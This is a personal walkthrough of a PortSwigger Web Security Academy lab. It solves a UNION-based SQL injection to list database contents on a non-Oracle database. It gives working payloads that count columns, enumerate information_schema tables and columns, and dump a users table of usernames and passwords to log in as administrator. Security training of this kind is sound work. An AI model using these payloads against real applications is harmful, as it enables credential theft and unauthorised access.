---
title: 'Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:'
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/SQL"
---

# Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description:  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 
* Goal: To solve the lab, log in as the administrator user.

## Exp
1. Determine # of columns
Payload: `?category=Gifts' union select NULL,NULL --`

2. Determine which column contained text string
Payload: `?category=Gifts' union select 'a','b' --`

3. According to [cheat sheet](https://portswigger.net/web-security/sql-injection/examining-the-database)
We can use `information_schema.tables` to search `table_name`
For instance: `SELECT * FROM information_schema.tables`
![](https://i.imgur.com/ThON4MR.png)

    Payload: `?category=Gifts' union SELECT TABLE_NAME,NULL FROM information_schema.tables--`
    :::spoiler Result
    ![](https://i.imgur.com/DhL1g5i.png)
    :::
4. Then tried the specific one - `users_rjrgxf`
Payload: `?category=Gifts' union SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_rjrgxf'--
`
    :::spoiler Result
    ![](https://i.imgur.com/egzZ49U.png)
    :::
5. Tried dig deeper
    Payload: `?category=Gifts' union SELECT username_ngqqos,password_jraqsv FROM users_rjrgxf--
    `
    Then you'll get the password of `administrator` $\to$ login directrly
    :::spoiler Success Screenshot
    ![](https://i.imgur.com/CKhLZdj.png)
    :::

## Reference